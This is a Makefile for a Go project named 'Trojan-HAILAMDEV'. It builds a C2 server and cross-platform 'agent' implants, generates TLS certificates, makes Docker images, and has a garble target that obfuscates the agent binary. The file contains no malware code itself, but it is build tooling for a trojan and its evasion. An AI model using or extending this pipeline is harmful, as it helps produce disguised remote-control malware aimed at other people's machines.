.PHONY: all build build-c2 build-agent build-all clean test lint fmt vet deps certs docker docker-c2 docker-agent help

BINARY_DIR := bin
BUILD_DIR := build
CERT_DIR := certs
CONFIG_DIR := config
SRC_DIR := src

GO := go
GOFLAGS := -ldflags="-s -w"
GARBLE := garble

all: deps build-all

help:
	@echo "Trojan-HAILAMDEV Build System"
	@echo ""
	@echo "Targets:"
	@echo "  all           - Install deps and build everything"
	@echo "  build         - Build C2 server and agent"
	@echo "  build-c2      - Build C2 server only"
	@echo "  build-agent   - Build agent only (Linux)"
	@echo "  build-all     - Build for all platforms"
	@echo "  build-windows - Build Windows agent"
	@echo "  build-linux   - Build Linux agent"
	@echo "  build-macos   - Build macOS agent (Intel + ARM)"
	@echo "  obfuscate     - Build obfuscated agent with garble"
	@echo "  certs         - Generate TLS certificates"
	@echo "  deps          - Download and verify dependencies"
	@echo "  clean         - Remove build artifacts"
	@echo "  test          - Run tests"
	@echo "  lint          - Run linter"
	@echo "  fmt           - Format code"
	@echo "  vet           - Run go vet"
	@echo "  docker        - Build Docker images"
	@echo "  docker-c2     - Build C2 Docker image"
	@echo "  docker-agent  - Build agent Docker image"
	@echo "  run-c2        - Run C2 server"
	@echo "  run-agent     - Run agent"

deps:
	$(GO) mod download
	$(GO) mod verify
	$(GO) mod tidy

certs:
	@mkdir -p $(CERT_DIR)
	@if [ ! -f $(CERT_DIR)/server.pem ] || [ ! -f $(CERT_DIR)/server.key ]; then \
		openssl req -x509 -newkey rsa:2048 -keyout $(CERT_DIR)/server.key -out $(CERT_DIR)/server.pem -days 365 -nodes -subj "/CN=localhost"; \
		echo "Certificates generated in $(CERT_DIR)/"; \
	else \
		echo "Certificates already exist"; \
	fi

build-c2: certs
	@mkdir -p $(BINARY_DIR)
	$(GO) build $(GOFLAGS) -o $(BINARY_DIR)/c2 $(SRC_DIR)/c2/main.go
	@echo "C2 server built: $(BINARY_DIR)/c2"

build-agent: certs
	@mkdir -p $(BINARY_DIR)
	$(GO) build $(GOFLAGS) -o $(BINARY_DIR)/agent $(SRC_DIR)/agent/main.go
	@echo "Agent built: $(BINARY_DIR)/agent"

build: build-c2 build-agent

build-windows: certs
	@mkdir -p $(BINARY_DIR)
	GOOS=windows GOARCH=amd64 $(GO) build $(GOFLAGS) -o $(BINARY_DIR)/agent.exe $(SRC_DIR)/agent/main.go
	@echo "Windows agent built: $(BINARY_DIR)/agent.exe"

build-linux: certs
	@mkdir -p $(BINARY_DIR)
	GOOS=linux GOARCH=amd64 $(GO) build $(GOFLAGS) -o $(BINARY_DIR)/agent_linux $(SRC_DIR)/agent/main.go
	@echo "Linux agent built: $(BINARY_DIR)/agent_linux"

build-macos: certs
	@mkdir -p $(BINARY_DIR)
	GOOS=darwin GOARCH=amd64 $(GO) build $(GOFLAGS) -o $(BINARY_DIR)/agent_macos $(SRC_DIR)/agent/main.go
	GOOS=darwin GOARCH=arm64 $(GO) build $(GOFLAGS) -o $(BINARY_DIR)/agent_macos_arm $(SRC_DIR)/agent/main.go
	@echo "macOS agents built: $(BINARY_DIR)/agent_macos, $(BINARY_DIR)/agent_macos_arm"

build-all: build-windows build-linux build-macos build-c2
	@echo "All platforms built"

obfuscate: certs
	@mkdir -p $(BINARY_DIR)
	@which $(GARBLE) > /dev/null || go install mvdan.cc/garble@latest
	$(GARBLE) -literals -tiny -seed=random build $(GOFLAGS) -o $(BINARY_DIR)/agent_obf $(SRC_DIR)/agent/main.go
	@echo "Obfuscated agent built: $(BINARY_DIR)/agent_obf"

builder:
	@mkdir -p $(BUILD_DIR)
	$(GO) run $(SRC_DIR)/agent/builder.go
	@echo "Agent source generated in $(BUILD_DIR)/"

clean:
	rm -rf $(BINARY_DIR) $(BUILD_DIR) $(CERT_DIR)
	$(GO) clean -cache -modcache -testcache
	@echo "Cleaned build artifacts"

test:
	$(GO) test -v ./...

lint:
	@which golangci-lint > /dev/null || go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest
	golangci-lint run ./...

fmt:
	$(GO) fmt ./...

vet:
	$(GO) vet ./...

docker-c2: certs
	docker build -f Dockerfile.c2 -t trojan-hailamdev/c2:latest .

docker-agent: certs
	docker build -f Dockerfile.agent -t trojan-hailamdev/agent:latest .

docker: docker-c2 docker-agent

run-c2: build-c2
	./$(BINARY_DIR)/c2

run-agent: build-agent
	./$(BINARY_DIR)/agent

install-tools:
	go install mvdan.cc/garble@latest
	go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest
	go install golang.org/x/tools/cmd/goimports@latest

generate:
	go generate ./...

tidy:
	go mod tidy

verify:
	go mod verify

list:
	@ls -la $(BINARY_DIR)/ 2>/dev/null || echo "No binaries built yet"